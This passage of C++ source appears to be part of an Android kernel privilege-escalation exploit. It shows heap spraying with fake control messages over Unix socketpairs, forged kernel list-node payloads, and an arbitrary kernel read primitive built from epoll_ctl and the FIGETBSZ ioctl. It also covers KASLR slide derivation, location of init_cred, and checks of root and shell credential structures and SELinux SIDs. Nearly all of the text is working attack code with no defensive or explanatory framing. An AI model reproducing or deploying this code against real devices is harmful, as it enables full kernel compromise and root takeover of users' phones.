    slot->activation.store(0, std::memory_order_relaxed);
    slot->tid = -1;
    slot->state.store(0, std::memory_order_relaxed);
    if (clear_poison) {
        slot->poisoned = false;
        slot->poison_victim = -1;
    }
    return true;
}

bool prepare_fake_control_spray(const std::uint8_t* payload,
                                int* prefilled_messages,
                                bool indexed = false,
                                int staged_limit = kFakeControlStagedCount) {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    if (g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire) ||
        g_fake_control_active || payload == nullptr ||
        (staged_limit != kFakeControlStagedCount &&
         staged_limit != kFakeControlReplacementStagedCount)) {
        return false;
    }
    ++g_fake_control_generation;
    if (g_fake_control_generation == 0) {
        ++g_fake_control_generation;
    }
    ++g_fake_control_staged_generation;
    if (g_fake_control_staged_generation == 0) {
        ++g_fake_control_staged_generation;
    }
    g_fake_control_gate.store(0, std::memory_order_relaxed);
    g_fake_control_staged_gate.store(0, std::memory_order_relaxed);
    int eligible = 0;
    for (const auto& slot : g_fake_control_slots) {
        eligible += !slot.poisoned ? 1 : 0;
    }
    g_fake_control_staged_limit = staged_limit;
    g_fake_control_staged_expected = std::min(staged_limit, eligible);
    g_fake_control_active = true;
    g_fake_control_expected = 0;
    *prefilled_messages = 0;

    pthread_attr_t attributes;
    pthread_attr_init(&attributes);
    pthread_attr_setstacksize(&attributes, 32 * 1024);
    for (int index = 0; index < kFakeControlSprayCount; ++index) {
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            pthread_attr_destroy(&attributes);
            release_fake_control_spray_locked();
            return false;
        }
        auto& slot = g_fake_control_slots[index];
        if (slot.poisoned) {
            continue;
        }
        slot.staged.store(g_fake_control_expected <
                        g_fake_control_staged_expected,
                std::memory_order_release);
        slot.staged_generation = slot.staged.load(
                std::memory_order_acquire) ?
                g_fake_control_staged_generation : 0;
        std::memcpy(slot.payload, payload, sizeof(slot.payload));
        if (indexed) {
            std::uint64_t pointer = kIndexedPtrBase |
                    static_cast<std::uint32_t>(index);
            std::uint64_t cookie = kIndexedCookieBase |
                    static_cast<std::uint32_t>(index);
            std::memcpy(slot.payload + 88, &pointer, sizeof(pointer));
            std::memcpy(slot.payload + 96, &cookie, sizeof(cookie));
        }
        slot.state.store(0, std::memory_order_relaxed);
        slot.activation.store(0, std::memory_order_relaxed);
        slot.rearm_requested.store(false, std::memory_order_relaxed);
        slot.result = -1;
        slot.rearm_result = -1;
        slot.saved_errno = 0;
        slot.rearm_errno = 0;
        slot.tid = -1;
        int send_buffer = 4096;
        if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC,
                       0, slot.pair) != 0 ||
            setsockopt(slot.pair[0], SOL_SOCKET, SO_SNDBUF,
                       &send_buffer, sizeof(send_buffer)) != 0) {
            pthread_attr_destroy(&attributes);
            release_fake_control_spray_locked();
            return false;
        }
        iovec vector {};
        vector.iov_base = slot.payload;
        vector.iov_len = sizeof(slot.payload);
        msghdr message {};
        message.msg_iov = &vector;
        message.msg_iovlen = 1;
        int filled = 0;
        while (sendmsg(slot.pair[0], &message,
                       MSG_DONTWAIT | MSG_NOSIGNAL) > 0) {
            ++filled;
        }
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire) ||
            filled == 0 || (errno != EAGAIN && errno != EWOULDBLOCK) ||
            pthread_create(&slot.thread, &attributes,
                           run_fake_control_sender, &slot) != 0) {
            pthread_attr_destroy(&attributes);
            release_fake_control_spray_locked();
            return false;
        }
        slot.created = true;
        ++g_fake_control_expected;
        *prefilled_messages += filled;
    }
    pthread_attr_destroy(&attributes);
    for (int attempt = 0; attempt < 2000; ++attempt) {
        int ready = 0;
        for (auto& slot : g_fake_control_slots) {
            ready += !slot.poisoned && slot.created &&
                    slot.state.load(std::memory_order_acquire) == 1;
        }
        if (ready == g_fake_control_expected && ready > 0 &&
            !g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            return true;
        }
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            release_fake_control_spray_locked();
            return false;
        }
        usleep(1000);
    }
    release_fake_control_spray_locked();
    return false;
}

int activate_fake_control_spray() {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    if (!g_fake_control_active) {
        return 0;
    }
    if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire)) {
        release_fake_control_spray_locked();
        return 0;
    }
    int staged_limit = g_fake_control_staged_limit;
    int staged_expected = g_fake_control_staged_expected;
    int staged_active = 0;
    for (const auto& slot : g_fake_control_slots) {
        staged_active += fake_control_slot_active_staged(slot) ? 1 : 0;
    }
    if (staged_limit <= 0 || staged_expected <= 0 ||
        staged_active != staged_expected ||
        staged_expected != std::min(staged_limit,
                g_fake_control_expected)) {
        release_fake_control_spray_locked();
        return 0;
    }
    wake_fake_control_staged_waiters_locked();
    auto staged_state = [&]() {
        int entered = 0;
        bool invalid = false;
        for (const auto& slot : g_fake_control_slots) {
            if (!fake_control_slot_active_staged(slot)) {
                continue;
            }
            int state = slot.state.load(std::memory_order_acquire);
            if (state == 2) {
                ++entered;
            } else if (state >= 3) {
                invalid = true;
            }
        }
        return std::pair<int, bool>(entered, invalid);
    };
    bool staged_blocked = false;
    for (int attempt = 0; attempt < 2000; ++attempt) {
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            break;
        }
        auto state = staged_state();
        if (state.second) {
            break;
        }
        if (state.first == staged_expected) {
            staged_blocked = true;
            break;
        }
        usleep(1000);
    }
    if (!staged_blocked) {
        release_fake_control_spray_locked();
        return 0;
    }
    usleep(1000);
    auto rechecked_staged = staged_state();
    if (rechecked_staged.second ||
        rechecked_staged.first != staged_expected) {
        release_fake_control_spray_locked();
        return 0;
    }
    g_fake_control_gate.store(1, std::memory_order_release);
    syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE, INT_MAX,
            nullptr, nullptr, 0);
    bool all_blocked = false;
    for (int attempt = 0; attempt < 2000; ++attempt) {
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            break;
        }
        int entered = 0;
        bool invalid = false;
        for (auto& slot : g_fake_control_slots) {
            if (slot.poisoned || !slot.created) {
                continue;
            }
            int state = slot.state.load(std::memory_order_acquire);
            if (state == 2) {
                ++entered;
            } else if (state >= 3) {
                invalid = true;
            }
        }
        if (entered == g_fake_control_expected) {
            all_blocked = true;
            break;
        }
        if (invalid) {
            break;
        }
        usleep(1000);
    }
    if (!all_blocked) {
        release_fake_control_spray_locked();
        return 0;
    }
    usleep(200000);
    int blocked = 0;
    for (auto& slot : g_fake_control_slots) {
        if (slot.poisoned || !slot.created) {
            continue;
        }
        blocked += slot.state.load(std::memory_order_acquire) == 2;
    }
    return blocked;
}

int retain_poisoned_control(int selected_index, int victim) {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    if (g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire) ||
        !g_fake_control_active || selected_index < 0 ||
        selected_index >= kFakeControlSprayCount ||
        victim < 0 || victim >= kRawVictimCount ||
        g_fake_control_slots[selected_index].poisoned ||
        g_fake_control_slots[selected_index].state.load(
                std::memory_order_acquire) != 2) {
        return -1;
    }
    g_fake_control_slots[selected_index].poisoned = true;
    g_fake_control_slots[selected_index].poison_victim = victim;
    return release_fake_control_spray_locked();
}

int poisoned_control_count_locked() {
    int count = 0;
    for (const auto& slot : g_fake_control_slots) {
        count += slot.poisoned ? 1 : 0;
    }
    return count;
}

int poisoned_control_count() {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    return poisoned_control_count_locked();
}

bool poisoned_control_victims_locked(std::set<int>* victims) {
    victims->clear();
    int poisoned = 0;
    for (const auto& slot : g_fake_control_slots) {
        if (!slot.poisoned) {
            continue;
        }
        ++poisoned;
        if (slot.poison_victim < 0 ||
            slot.poison_victim >= kRawVictimCount ||
            !victims->insert(slot.poison_victim).second) {
            return false;
        }
    }
    return static_cast<int>(victims->size()) == poisoned;
}

void record_terminal_cleanup_stage(const char* stage) {
    constexpr const char* kStagePath =
            "/data/user/0/com.vandam.prism/files/"
            "terminal-cleanup.stage";
    int fd = open(kStagePath,
            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (fd >= 0) {
        write(fd, stage, std::strlen(stage));
        fsync(fd);
        close(fd);
    }
}

int release_poisoned_control_locked() {
    record_terminal_cleanup_stage("spray-release-start");
    if (!g_terminal_ctlbuf_repair_verified) {
        record_terminal_cleanup_stage("spray-release-repair-required");
        return -1;
    }
    wake_fake_control_staged_waiters_locked();
    g_fake_control_gate.store(1, std::memory_order_release);
    syscall(SYS_futex, &g_fake_control_gate, FUTEX_WAKE_PRIVATE, INT_MAX,
            nullptr, nullptr, 0);
    int released = 0;
    for (auto& slot : g_fake_control_slots) {
        if (!slot.poisoned) {
            continue;
        }
        char stage[64];
        std::snprintf(stage, sizeof(stage),
                "spray-slot-%d-release-start", slot.poison_victim);
        record_terminal_cleanup_stage(stage);
        if (slot.poison_victim == 0 &&
            g_raw_victim0_canonical_original) {
            if (!close_rearmed_fake_control_slot_locked(&slot, true)) {
                return -1;
            }
            ++released;
            record_terminal_cleanup_stage("spray-slot-0-released");
            continue;
        }
        if (slot.rearm_requested.load(std::memory_order_acquire) ||
            slot.rearm_pair[0] >= 0 || slot.rearm_pair[1] >= 0 ||
            slot.pair[0] < 0 || slot.pair[1] < 0 || !slot.created) {
            return -1;
        }
        shutdown(slot.pair[1], SHUT_RDWR);
        if (!close_owned_fd(slot.pair[1])) {
            return -1;
        }
        slot.pair[1] = -1;
        bool worker_finished = false;
        for (int attempt = 0; attempt < 2000; ++attempt) {
            if (slot.state.load(std::memory_order_acquire) == 3) {
                worker_finished = true;
                break;
            }
            usleep(1000);
        }
        if (!worker_finished) {
            return -1;
        }
        std::snprintf(stage, sizeof(stage),
                "spray-slot-%d-worker-finished", slot.poison_victim);
        record_terminal_cleanup_stage(stage);
        if (pthread_join(slot.thread, nullptr) != 0) {
            return -1;
        }
        slot.created = false;
        if (!close_owned_fd(slot.pair[0])) {
            return -1;
        }
        slot.pair[0] = -1;
        slot.staged.store(false, std::memory_order_relaxed);
        slot.staged_generation = 0;
        slot.rearm_requested.store(false, std::memory_order_relaxed);
        slot.activation.store(0, std::memory_order_relaxed);
        int victim = slot.poison_victim;
        slot.poisoned = false;
        slot.poison_victim = -1;
        slot.tid = -1;
        slot.state.store(0, std::memory_order_relaxed);
        ++released;
        std::snprintf(stage, sizeof(stage),
                "spray-slot-%d-released", victim);
        record_terminal_cleanup_stage(stage);
    }
    if (released > 0 && g_raw_victim0_canonical_original) {
        g_raw_victim0_canonical_original = false;
        g_raw_arbitrary_rearm_worker = -1;
    }
    record_terminal_cleanup_stage("spray-joins-finished");
    return released;
}

int release_poisoned_control() {
    std::lock_guard<std::mutex> lock(g_fake_control_mutex);
    return release_poisoned_control_locked();
}

std::vector<std::uint8_t> make_fake_node_payload(
        std::uint64_t node_address, std::uint64_t next,
        std::uint64_t pprev, bool safe_check) {
    std::vector<std::uint8_t> payload(128, 0);
    auto put32 = [&](int offset, std::uint32_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    auto put64 = [&](int offset, std::uint64_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    put64(0, 128);
    put64(8, node_address + 8);
    put64(16, node_address + 8);
    put32(24, 5);
    put64(32, next);
    put64(40, pprev);
    put64(56, 0);
    put64(64, 0);
    put32(72, 0);
    put32(76, safe_check ? 1 : 0);
    put32(80, 1);
    put32(84, 0);
    put64(88, kFakePtrMarker);
    put64(96, kFakeCookieMarker);
    put64(112, node_address + 112);
    put64(120, node_address + 112);
    return payload;
}

bool set_epitem_data(int epoll_fd, int watched_fd, std::uint64_t data) {
    epoll_event event {};
    event.events = EPOLLIN;
    event.data.u64 = data;
    return epoll_ctl(epoll_fd, EPOLL_CTL_MOD, watched_fd, &event) == 0;
}

bool arbitrary_read32(std::uint64_t address, std::uint32_t* value) {
    if (!g_arb_read_ready || g_selected_epoll_fd < 0 || value == nullptr ||
        address < 24 || g_arb_file_fd < 0 ||
        g_selected_epoll_watched_fd < 0) {
        return false;
    }
    for (int attempt = 0; attempt < 4; ++attempt) {
        int result = 0;
        errno = 0;
        if (set_epitem_data(g_selected_epoll_fd,
                            g_selected_epoll_watched_fd, address - 24) &&
            ioctl(g_arb_file_fd, FIGETBSZ, &result) == 0) {
            *value = static_cast<std::uint32_t>(result);
            return true;
        }
        usleep(250);
    }
    return false;
}

bool arbitrary_read64(std::uint64_t address, std::uint64_t* value) {
    std::uint32_t low = 0;
    std::uint32_t high = 0;
    if (!arbitrary_read32(address, &low) ||
        !arbitrary_read32(address + 4, &high)) {
        return false;
    }
    *value = low | (static_cast<std::uint64_t>(high) << 32U);
    return true;
}

bool reliable_read64(std::uint64_t address, std::uint64_t* value) {
    for (int attempt = 0; attempt < 4; ++attempt) {
        if (arbitrary_read64(address, value)) {
            return true;
        }
    }
    return false;
}

bool reliable_read32(std::uint64_t address, std::uint32_t* value) {
    for (int attempt = 0; attempt < 4; ++attempt) {
        if (arbitrary_read32(address, value)) {
            return true;
        }
    }
    return false;
}

int g_zero_read_result = 0;
int g_zero_read_errno = 0;
std::uint64_t g_zero_read_address = 0;
int g_zero_snapshot_stage = 0;
std::uint64_t g_zero_snapshot_header = 0;
int g_zero_snapshot_id_index = -1;
std::uint64_t g_zero_snapshot_id_value = 0;
std::uint64_t g_zero_snapshot_repair = UINT64_MAX;
std::uint64_t g_zero_snapshot_security = 0;
std::uint32_t g_zero_snapshot_sid = 0;
std::uint64_t g_zero_snapshot_final_header = 0;
int g_live_security_target_stage = 0;

bool arbitrary_read32_allow_zero(
        std::uint64_t address, std::uint64_t control_address,
        std::uint64_t expected_control, std::uint32_t* value) {
    if (!g_arb_read_ready || g_selected_epoll_fd < 0 || value == nullptr ||
        address < 24 || control_address < 24 || g_arb_file_fd < 0 ||
        g_selected_epoll_watched_fd < 0 ||
        !kernel_pointer(expected_control) ||
        static_cast<std::uint32_t>(expected_control) == 0) {
        return false;
    }
    std::uint64_t before = 0;
    if (!reliable_read64(control_address, &before) ||
        before != expected_control) {
        return false;
    }
    int result = 0;
    errno = 0;
    bool positioned = set_epitem_data(
            g_selected_epoll_fd, g_selected_epoll_watched_fd,
            address - 24);
    int ioctl_result = positioned
            ? ioctl(g_arb_file_fd, FIGETBSZ, &result) : -1;
    int read_errno = errno;
    g_zero_read_address = address;
    g_zero_read_result = ioctl_result;
    g_zero_read_errno = read_errno;
    std::uint64_t after = 0;
    bool control_valid = reliable_read64(control_address, &after) &&
            after == expected_control;
    if (!positioned || !control_valid ||
        (ioctl_result != 0 &&
         !(ioctl_result == -1 && read_errno == EINVAL))) {
        return false;
    }
    // Android 5.10 FIGETBSZ reports a zero block size as EINVAL.
    *value = ioctl_result == 0
            ? static_cast<std::uint32_t>(result) : 0;
    return true;
}

bool reliable_read64_allow_zero(
        std::uint64_t address, std::uint64_t control_address,
        std::uint64_t expected_control, std::uint64_t* value) {
    for (int attempt = 0; attempt < 4; ++attempt) {
        std::uint32_t low = 0;
        std::uint32_t high = 0;
        if (arbitrary_read32_allow_zero(
                    address, control_address, expected_control, &low) &&
            arbitrary_read32_allow_zero(
                    address + 4, control_address,
                    expected_control, &high)) {
            *value = low | (static_cast<std::uint64_t>(high) << 32U);
            return true;
        }
    }
    return false;
}

bool read_credential_snapshot(
        std::uint64_t cred, std::uint64_t cred_slot,
        std::uint64_t snapshot[kCredentialSnapshotWords],
        std::uint32_t* sid) {
    if (!kernel_pointer(cred) || !kernel_pointer(cred_slot) ||
        snapshot == nullptr || sid == nullptr) {
        return false;
    }
    for (int index = 0; index < kCredentialSnapshotWords; ++index) {
        if (!reliable_read64_allow_zero(
                    cred + static_cast<std::uint64_t>(index) * 8,
                    cred_slot, cred, &snapshot[index])) {
            return false;
        }
    }
    std::uint64_t security = snapshot[15];
    return kernel_pointer(security) &&
            reliable_read32(security + 4, sid);
}

bool shell_credential_snapshot_valid(
        const std::uint64_t snapshot[kCredentialSnapshotWords],
        std::uint32_t sid, std::uint64_t expected_user_ns) {
    constexpr std::uint64_t kShellIds =
            UINT64_C(2000) | (UINT64_C(2000) << 32U);
    if (static_cast<std::uint32_t>(snapshot[0]) != 2 ||
        static_cast<std::uint32_t>(snapshot[0] >> 32U) != 2000 ||
        sid == 0) {
        return false;
    }
    for (int index = 0; index < 4; ++index) {
        std::uint64_t pair = 0;
        std::memcpy(&pair,
                    reinterpret_cast<const std::uint8_t*>(snapshot) +
                            4 + index * 8,
                    sizeof(pair));
        if (pair != kShellIds) {
            return false;
        }
    }
    constexpr std::uint64_t kShellBoundingCaps = UINT64_C(0xc0);
    constexpr std::uint32_t kShellSecurebits = 47;
    return static_cast<std::uint32_t>(snapshot[4] >> 32U) ==
                    kShellSecurebits &&
            snapshot[5] == 0 && snapshot[6] == 0 &&
            snapshot[7] == 0 &&
            snapshot[8] == kShellBoundingCaps && snapshot[9] == 0 &&
            kernel_pointer(snapshot[15]) &&
            kernel_pointer(snapshot[16]) &&
            kernel_address(expected_user_ns) &&
            snapshot[17] == expected_user_ns &&
            kernel_pointer(snapshot[18]);
}

bool validate_zero_root_cred_snapshot(
        std::uint64_t task, std::uint64_t cred,
        std::uint64_t real_cred_slot, std::uint64_t cred_slot,
        std::uint64_t expected_security, std::uint32_t expected_sid,
        std::uint64_t* repair_value) {
    if (!kernel_pointer(task) || !kernel_pointer(cred) ||
        !kernel_pointer(expected_security) || expected_sid == 0 ||
        real_cred_slot < task || real_cred_slot + 16 > task + 0x3000 ||
        cred_slot != real_cred_slot + 8 || repair_value == nullptr) {
        return false;
    }
    g_zero_snapshot_stage = 1;
    g_zero_snapshot_header = 0;
    g_zero_snapshot_id_index = -1;
    g_zero_snapshot_id_value = 0;
    g_zero_snapshot_repair = UINT64_MAX;
    g_zero_snapshot_security = 0;
    g_zero_snapshot_sid = 0;
    g_zero_snapshot_final_header = 0;
    std::uint64_t real_before = 0;
    std::uint64_t cred_before = 0;
    std::uint64_t header = 0;
    std::uint64_t ids[4] {};
    std::uint64_t repair = UINT64_MAX;
    std::uint64_t effective_caps = 0;
    std::uint64_t security = 0;
    std::uint32_t sid = 0;
    std::uint64_t real_after = 0;
    std::uint64_t cred_after = 0;
    std::uint64_t final_header = 0;
    if (!reliable_read64(real_cred_slot, &real_before) ||
        real_before != cred) {
        return false;
    }
    g_zero_snapshot_stage = 2;
    if (!reliable_read64(cred_slot, &cred_before) ||
        cred_before != cred) {
        return false;
    }
    g_zero_snapshot_stage = 3;
    if (!reliable_read64_allow_zero(
                cred, cred_slot, cred, &header)) {
        return false;
    }
    g_zero_snapshot_header = header;
    std::uint32_t usage = static_cast<std::uint32_t>(header);
    std::uint32_t uid = static_cast<std::uint32_t>(header >> 32U);
    g_zero_snapshot_stage = 4;
    if (usage < 16 || usage > 4096 ||
        uid != 0) {
        return false;
    }
    for (int index = 0; index < 4; ++index) {
        g_zero_snapshot_stage = 5 + index;
        g_zero_snapshot_id_index = index;
        if (!reliable_read64_allow_zero(
                    cred + 4 + index * 8, cred_slot, cred,
                    &ids[index])) {
            return false;
        }
        g_zero_snapshot_id_value = ids[index];
        if (ids[index] != 0) {
            return false;
        }
    }
    g_zero_snapshot_stage = 9;
    if (!reliable_read64_allow_zero(
                cred + 8, cred_slot, cred, &repair)) {
        return false;
    }
    g_zero_snapshot_repair = repair;
    if (repair != 0) {
        return false;
    }
    g_zero_snapshot_stage = 10;
    if (!reliable_read64_allow_zero(
                cred + 56, cred_slot, cred, &effective_caps) ||
            effective_caps == 0 ||
            effective_caps != g_security_target_cred_caps) {
        return false;
    }
    if (!reliable_read64(cred + kCredSecurityOffset, &security)) {
        return false;
    }
    g_zero_snapshot_security = security;
    if (security != expected_security) {
        return false;
    }
    g_zero_snapshot_stage = 11;
    if (!reliable_read32(security + 4, &sid)) {
        return false;
    }
    g_zero_snapshot_sid = sid;
    if (sid != expected_sid) {
        return false;
    }
    g_zero_snapshot_stage = 12;
    if (!reliable_read64(real_cred_slot, &real_after) ||
        real_after != cred) {
        return false;
    }
    g_zero_snapshot_stage = 13;
    if (!reliable_read64(cred_slot, &cred_after) ||
        cred_after != cred) {
        return false;
    }
    g_zero_snapshot_stage = 14;
    if (!reliable_read64_allow_zero(
                cred, cred_slot, cred, &final_header)) {
        return false;
    }
    g_zero_snapshot_final_header = final_header;
    if (final_header != header) {
        return false;
    }
    g_zero_snapshot_stage = 15;
    *repair_value = repair;
    return true;
}

bool validate_live_security_target(bool cached_proc_only = false) {
    g_live_security_target_stage = 0;
    std::uint64_t target_proc = cached_proc_only
            ? g_security_target_proc
            : g_security_target_handle > 0
            ? find_target_binder_proc(
                    g_cached_current_binder_proc,
                    g_security_target_handle)
            : g_security_target_proc;
    std::uint32_t target_pid = 0;
    std::uint64_t target_task = 0;
    std::uint64_t target_cred = 0;
    std::uint64_t target_security = 0;
    std::uint64_t target_caps = 0;
    std::uint32_t target_sid = 0;
    if (!kernel_pointer(target_proc) ||
        !security_target_proc_is_live(target_proc)) {
        return false;
    }
    g_live_security_target_stage = 1;
    if (!reliable_read32(target_proc + 64, &target_pid) ||
        target_pid != static_cast<std::uint32_t>(
                g_security_target_pid)) {
        return false;
    }
    g_live_security_target_stage = 2;
    if (!reliable_read64(target_proc + 72, &target_task) ||
        target_task != g_security_target_task) {
        return false;
    }
    g_live_security_target_stage = 3;
    if (!reliable_read64(target_proc + 0x258, &target_cred) ||
        target_cred != g_security_target_cred) {
        return false;
    }
    g_live_security_target_stage = 4;
    if (!reliable_read64_allow_zero(
                target_cred + 56,
                g_security_target_cred_slot,
                g_security_target_cred, &target_caps) ||
        target_caps != g_security_target_cred_caps) {
        return false;
    }
    g_live_security_target_stage = 5;
    if (!reliable_read64(
                target_cred + kCredSecurityOffset,
                &target_security) ||
        target_security != g_security_target_blob) {
        return false;
    }
    g_live_security_target_stage = 6;
    if (!reliable_read32(target_security + 4, &target_sid) ||
        target_sid != g_fake_security_sid) {
        return false;
    }
    g_live_security_target_stage = 7;
    return true;
}

bool find_cred_slots(std::uint64_t task, std::uint64_t cred,
                     std::uint64_t* real_cred_slot,
                     std::uint64_t* cred_slot) {
    if (!kernel_pointer(task) || !kernel_pointer(cred) ||
        real_cred_slot == nullptr || cred_slot == nullptr) {
        return false;
    }
    constexpr std::uint64_t kTaskScanSize = 0x3000;
    for (std::uint64_t offset = 0;
         offset + 16 <= kTaskScanSize; offset += 8) {
        std::uint64_t first = 0;
        std::uint64_t second = 0;
        if (!reliable_read64(task + offset, &first) || first != cred ||
            !reliable_read64(task + offset + 8, &second) || second != cred) {
            continue;
        }
        *real_cred_slot = task + offset;
        *cred_slot = task + offset + 8;
        return true;
    }
    return false;
}

bool validate_init_cred(std::uint64_t address, std::uint32_t* usage,
                        std::uint32_t* sid, std::uint64_t* effective_caps,
                        bool require_live_usage = true) {
    std::uint64_t header = 0;
    std::uint64_t ids[4] {};
    std::uint64_t security = 0;
    std::uint64_t caps = 0;
    bool valid = kernel_address(address) &&
            reliable_read64(address, &header);
    for (int index = 0; valid && index < 4; ++index) {
        valid = reliable_read64(address + 4 + index * 8, &ids[index]) &&
                ids[index] == 0;
    }
    valid = valid && reliable_read64(address + 56, &caps) &&
            reliable_read64(address + kCredSecurityOffset, &security) &&
            kernel_address(security);
    std::uint32_t security_sid = 0;
    valid = valid && arbitrary_read32(security + 4, &security_sid) &&
            security_sid != 0;
    std::uint32_t cred_usage = static_cast<std::uint32_t>(header);
    std::uint32_t uid = static_cast<std::uint32_t>(header >> 32U);
    valid = valid && (!require_live_usage || cred_usage > 0) &&
            cred_usage <= 64 && uid == 0;
    if (valid) {
        *usage = cred_usage;
        *sid = security_sid;
        *effective_caps = caps;
    }
    return valid;
}

bool derive_kernel_profile(std::uint64_t task, std::uint64_t* slide,
                           std::uint64_t* init_cred,
                           std::uint32_t* init_usage,
                           std::uint32_t* init_sid,
                           std::uint64_t* init_effective_caps,
                           std::uint64_t* sched_slot) {
    if (!kernel_pointer(task)) {
        return false;
    }
    constexpr std::uint64_t kTaskScanSize = 0x3000;
    for (std::uint64_t offset = 0;
         offset + 8 <= kTaskScanSize; offset += 8) {
        std::uint64_t pointer = 0;
        if (!reliable_read64(task + offset, &pointer) ||
            !kernel_address(pointer) ||
            (pointer & (kKaslrAlignment - 1)) !=
                    (kFairSchedClassLinkAddress &
                     (kKaslrAlignment - 1))) {
            continue;
        }
        std::uint64_t candidate_base = pointer - kFairSchedClassOffset;
        if (!kernel_address(candidate_base) ||
            (candidate_base & (kKaslrAlignment - 1)) != 0) {
            continue;
        }
        std::uint64_t candidate_slide = candidate_base - kKernelLinkBase;
        std::uint64_t candidate_cred = candidate_base + kInitCredOffset;
        std::uint32_t usage = 0;
        std::uint32_t sid = 0;
        std::uint64_t caps = 0;
        if (!validate_init_cred(candidate_cred, &usage, &sid, &caps)) {
            continue;
        }
        *slide = candidate_slide;
        *init_cred = candidate_cred;
        *init_usage = usage;
        *init_sid = sid;
        *init_effective_caps = caps;
        *sched_slot = task + offset;
        return true;
    }
    return false;
}

std::uint64_t find_current_binder_proc() {
    g_last_binder_probe_file = 0;
    g_last_binder_probe_fops = 0;
    g_last_binder_probe_base = 0;
    g_last_binder_probe_init_cred = 0;
    g_last_binder_probe_init_header = 0;
    std::fill(std::begin(g_last_binder_probe_init_ids),
              std::end(g_last_binder_probe_init_ids), 0);
    g_last_binder_probe_init_caps = 0;
    g_last_binder_probe_init_security = 0;
    g_last_binder_probe_init_sid = 0;
    g_last_main_binder_proc = 0;
    g_last_binder_probe_anchor_proc = 0;
    g_last_binder_probe_nodes = 0;
    g_last_binder_probe_marker_offset = -1;
    g_last_binder_probe_stage = 1;
    g_last_binder_probe_errno = 0;
    if (g_selected_epoll_fd < 0 ||
        g_selected_epoll_watched_fd < 0 || !g_arb_read_ready) {
        return 0;
    }
    std::vector<std::uint64_t> candidates;
    {
        std::lock_guard<std::mutex> lock(g_node_candidate_mutex);
        candidates = g_node_candidates;
    }
    g_last_binder_probe_stage = 2;
    for (std::uint64_t node : candidates) {
        std::uint64_t proc = 0;
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
        std::uint64_t refs = 0;
        ++g_last_binder_probe_nodes;
        if (!kernel_pointer(node) ||
            !arbitrary_read64(node + 56, &proc) ||
            !kernel_pointer(proc) ||
            !arbitrary_read32(proc + 64, &pid) ||
            pid != static_cast<std::uint32_t>(getpid()) ||
            !arbitrary_read64(proc + 72, &task) || !kernel_pointer(task) ||
            !arbitrary_read64(proc + 32, &refs) ||
            (refs != 0 && !kernel_pointer(refs))) {
            continue;
        }
        g_last_binder_probe_file = node;
        g_last_main_binder_proc = proc;
        g_last_binder_probe_marker_offset = 56;
        g_last_binder_probe_stage = 3;
        break;
    }

    std::uint64_t disclosed = g_disclosed_node_address.load();
    if (kernel_pointer(disclosed) &&
        std::find(candidates.begin(), candidates.end(), disclosed) ==
                candidates.end()) {
        candidates.push_back(disclosed);
    }
    g_last_binder_probe_stage = 4;
    std::uint64_t slide = 0;
    std::uint64_t init_cred = 0;
    std::uint64_t file = g_disclosed_file_address.load();
    std::uint64_t file_operations = 0;
    std::uint64_t runtime_base = 0;
    g_last_binder_probe_file = file;
    bool file_operations_read = kernel_pointer(file) &&
            reliable_read64(file + 40, &file_operations);
    g_last_binder_probe_fops = file_operations;
    bool image_address = file_operations >=
            UINT64_C(0xffffff8000000000);
    bool init_snapshot = false;
    if (file_operations_read && image_address) {
        runtime_base = file_operations - kEventfdFopsOffset;
        init_cred = runtime_base + kInitCredOffset;
        g_last_binder_probe_base = runtime_base;
        g_last_binder_probe_init_cred = init_cred;
        init_snapshot = reliable_read64(
                init_cred, &g_last_binder_probe_init_header);
        for (int index = 0; index < 4; ++index) {
            init_snapshot = init_snapshot && reliable_read64(
                    init_cred + 4 + index * 8,
                    &g_last_binder_probe_init_ids[index]);
        }
        init_snapshot = init_snapshot && reliable_read64(
                init_cred + 56, &g_last_binder_probe_init_caps) &&
                reliable_read64(init_cred + kCredSecurityOffset,
                                &g_last_binder_probe_init_security) &&
                kernel_address(g_last_binder_probe_init_security) &&
                arbitrary_read32(g_last_binder_probe_init_security + 4,
                                 &g_last_binder_probe_init_sid);
    }
    bool fops_valid = file_operations_read &&
            kernel_address(file_operations);
    bool base_valid = fops_valid && kernel_address(runtime_base);
    bool base_aligned = base_valid &&
            (runtime_base & (kKaslrAlignment - 1)) == 0;
    std::uint32_t captured_usage = static_cast<std::uint32_t>(
            g_last_binder_probe_init_header);
    std::uint32_t captured_uid = static_cast<std::uint32_t>(
            g_last_binder_probe_init_header >> 32U);
    bool captured_ids = true;
    for (std::uint64_t ids : g_last_binder_probe_init_ids) {
        captured_ids = captured_ids && ids == 0;
    }
    bool init_snapshot_valid = init_snapshot && captured_ids &&
            captured_usage <= 64 && captured_uid == 0 &&
            g_last_binder_probe_init_caps != 0 &&
            g_last_binder_probe_init_sid != 0;
    bool derived = base_aligned;
    if (!file_operations_read) {
        g_last_binder_probe_errno = 1;
    } else if (!fops_valid) {
        g_last_binder_probe_errno = 2;
    } else if (!base_valid) {
        g_last_binder_probe_errno = 3;
    } else if (!base_aligned) {
        g_last_binder_probe_errno = 4;
    } else if (!init_snapshot_valid) {
        g_last_binder_probe_errno = 5;
    }
    if (derived) {
        slide = runtime_base - kKernelLinkBase;
        g_last_binder_probe_file = file;
        g_profile_kernel_slide = slide;
        g_profile_init_cred = init_cred;
    }
    for (std::uint64_t node : candidates) {
        if (derived) {
            break;
        }
        std::uint64_t proc = 0;
        std::uint32_t pid = 0;
        std::uint64_t task = 0;
